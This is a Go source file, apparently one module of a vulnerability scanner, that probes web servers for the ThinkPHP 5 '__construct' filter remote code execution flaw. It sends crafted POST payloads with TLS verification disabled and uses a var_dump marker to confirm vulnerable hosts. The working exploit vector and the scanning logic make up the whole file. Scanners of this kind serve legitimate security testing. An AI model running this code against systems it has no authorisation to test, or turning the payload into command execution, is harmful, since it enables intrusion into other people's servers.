package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

//payload: /index.php
//POST: _method=__construct&filter[]=var_dump&get[]=tptfb11

var payloads2 []string

func debug_rce(baseurl string)  {
	flag := debug_rce1(baseurl) //接受返回的payload
	if  flag != "0"{
		fmt.Println(baseurl," [+] vul ! ! !\npayload: ",flag)
	} else {
		fmt.Println(baseurl," [-] not vull tpV5_construct_debug_rce")
	}
}

func debug_rce1(baseurl string) string  {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	payloads2 := append(payloads2, "_method=__construct&filter[]=var_dump&get[]=tptfb11","_method=__construct&filter[]=var_dump&server[REQUEST_METHOD]=tptfb11")
	for _,payload := range payloads2{
		flag := debug_rce2(baseurl,payload)
		if flag != "0"{
			return flag
		}
		url := baseurl + "/public/index.php"
		client := http.Client{
			Transport:     tr,
			CheckRedirect: nil,
			Jar:           nil,
			Timeout:       time.Second*5,
		}
		req, err := http.NewRequest("POST",url,strings.NewReader(payload))
		if err != nil {
			return "0"
		}
		req.Header.Set("User-Agent",user_agent)
		req.Header.Set("Content-Type",content_type)
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("[-] 请求超时，请检查url！ x.x")
			return "0"
		}
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return "0"
		}
		if (strings.Contains(string(body),"string(7) \"tptfb11\"")) {
			return payload
		} else {
			continue
		}
	}
	return "0"
}

func debug_rce2(baseurl string,payload string) string {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	url := baseurl + ""
	client := http.Client{
		Transport:     tr,
		CheckRedirect: nil,
		Jar:           nil,
		Timeout:       time.Second*5,
	}
	req, err := http.NewRequest("POST",url,strings.NewReader(payload))
	if err != nil {
		return "0"
	}
	req.Header.Set("Content-Type",content_type)
	req.Header.Set("User-Agent",user_agent)
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] 请求超时，请检查url！ x.x")
		return "0"
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "0"
	}
	if (strings.Contains(string(body),"string(7) \"tptfb11\"")){
		return payload
	} else {
		return "0"
	}
}
